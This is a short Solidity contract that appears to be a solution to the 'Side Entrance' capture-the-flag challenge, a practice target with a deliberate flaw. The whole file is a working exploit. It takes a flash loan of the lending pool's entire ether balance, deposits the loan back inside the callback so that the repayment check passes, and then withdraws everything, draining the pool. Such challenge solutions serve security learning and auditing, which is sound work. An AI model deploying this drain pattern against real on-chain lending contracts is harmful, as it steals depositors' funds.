// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver{
    SideEntranceLenderPool public lendingPool;

    error ExecutorIsNotPool();

    constructor(address poolAddress) {
        lendingPool = SideEntranceLenderPool(poolAddress);
    }

    receive() external payable {}

    function execute() external payable {
        if (msg.sender != address(lendingPool)) revert ExecutorIsNotPool();
        lendingPool.deposit{value: msg.value}();
    }

    function attack() public {
        uint256 poolBalance = address(lendingPool).balance;
        lendingPool.flashLoan(poolBalance);
        lendingPool.withdraw();
    }
}
